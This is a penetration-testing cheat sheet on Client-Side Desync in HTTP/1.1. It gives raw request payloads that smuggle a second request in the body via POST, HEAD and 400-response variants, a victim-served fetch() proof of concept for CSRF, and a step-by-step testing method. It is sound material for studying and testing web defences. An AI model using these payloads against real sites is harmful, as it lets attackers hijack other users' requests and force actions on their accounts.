# Client-Side Desync (CSD)

## Overview
Client-Side Desync exploits HTTP/1.1 request handling discrepancies where a browser's connection pooling can be manipulated, allowing an attacker to poison other users' requests without server-side smuggling requirements.

## Concept
```
# Traditional HTTP smuggling: requires server desync (CL.TE or TE.CL)
# Client-Side Desync: server correctly ignores body on certain requests,
# but browser pools the connection and sends next request on same TCP connection
# → Second request gets "prefixed" with attacker's injected body

# Conditions needed:
1. Server ignores request body for certain methods/endpoints (e.g., HEAD, 400 responses)
2. Server responds immediately without consuming body
3. Browser reuses connection → next victim request is poisoned
```

## Detection
```
# Find endpoints where server responds without consuming body:
# 1. Server responds to GET/HEAD with 200 but body is left in TCP buffer
# 2. Server responds to POST with 400/301/302 without consuming body
# 3. Content-Length mismatch where server ignores extra bytes

# Test with:
POST / HTTP/1.1
Host: target.com
Content-Length: 37

GET /poisoned HTTP/1.1
X-Ignore: x
```

## Pause-Based Detection
```
# Send request where body sits in TCP buffer
# If second request gets routed differently → desync exists

# Using Burp Suite HTTP/1 connection reuse:
# Send request 1 with oversized body
# Send request 2 on same connection
# Observe if request 2 behavior is affected
```

## CSD via HEAD
```
# HEAD response must not include body, but Content-Length may be set
# Leftover bytes in buffer prefix next request

HEAD / HTTP/1.1
Host: target.com

# Extra bytes in buffer:
GET /admin HTTP/1.1
Host: target.com
```

## CSD via 400 Responses
```
# Some servers return 400 before consuming body
# Body remains in TCP buffer
# Next request on pooled connection gets poisoned prefix

POST /resource HTTP/1.1
Host: target.com
Content-Length: 49

GET /poisoned-endpoint HTTP/1.1
X-Foo: bar
```

## CSRF via CSD
```
# Classic CSD attack for CSRF:
# 1. Attacker serves page that makes victim's browser:
#    - Connect to target.com
#    - Send a "poisoning" request with injected body
# 2. Next request from same connection (browser's pool) → prefixed with injected body
# 3. Victim's request gets modified → CSRF

# PoC (served to victim):
fetch('https://target.com/', {
    method: 'POST',
    credentials: 'include',
    body: "GET /csrf-endpoint HTTP/1.1\r\nX-Ignore: x\r\n\r\n",
    headers: {'Content-Type': 'text/plain'}
}).then(() => {
    return fetch('https://target.com/');
});
```

## Testing Methodology
1. Find endpoints that respond without consuming body (HEAD, error responses)
2. Test in Turbo Intruder or Burp with connection reuse
3. Identify if second request is affected by first's body
4. Craft CSRF PoC using fetch API
5. Confirm in browser that victim's requests are poisoned
6. Identify impactful target endpoint (account settings, admin action)

## Tools
- Burp Suite HTTP Request Smuggler extension
- Turbo Intruder for timing-based detection
- Browser DevTools network panel for connection reuse analysis

## Difference from HTTP Smuggling
```
# Traditional smuggling: backend server processes smuggled request
# CSD: no backend involvement — browser connection pool is confused
# CSD works even when backend correctly handles CL/TE
# CSD is cross-origin capable (attacker.com → target.com via CORS)
```
